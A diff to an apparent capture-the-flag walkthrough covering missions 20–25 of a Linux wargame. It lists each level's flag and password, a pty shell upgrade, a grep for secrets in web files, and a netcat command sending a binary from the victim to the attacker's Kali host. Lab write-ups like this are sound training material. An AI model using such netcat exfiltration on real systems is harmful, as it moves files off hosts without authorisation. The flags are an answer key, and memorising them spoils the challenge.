@@ -291,6 +291,122 @@ Password:  mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
 
 <figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>
 
+**Victim(mission20)**
+
+```
+cd /home/mission20/
+ls
+python flag.py 
+
+su mission21
+Password: mission21{7de756aabc528b446f6eb38419318f0c}
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mission21)**
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+su mission22
+Password: mission22{24caa74eb0889ed6a2e6984b42d49aaf}
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mission22)**
+
+```
+import pty; pty.spawn("/bin/bash")
+cd /home/mission22/
+ls
+cat flag.txt
+
+su mission23
+Password: mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mission23)**
+
+```
+cd /home/mission23/
+ls
+cat message.txt
+grep -r "mission" /var/www/html/ 2>/dev/null
+
+su mission24
+Password: mission24{dbaeb06591a7fd6230407df3a947b89c}
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mission24)**
+
+```
+cd /home/mission24
+ls
+./bribe
+```
+
+**Kali**
+
+```
+nc -l -p 1234 > bribe
+```
+
+**Victim(mission24)**
+
+```
+nc -w 3 $KALI 1234 < bribe
+```
+
+In Ghidra we can we there is a environment variable called pocket that needs to be set, if it's set to money it will run the if statement to show the flag
+
+**Kali**
+
+```
+ghidra
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(mission24)**
+
+```
+export pocket=money
+./bribe
+
+su mission25
+Password: mission25{61b93637881c87c71f220033b22a921b}
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
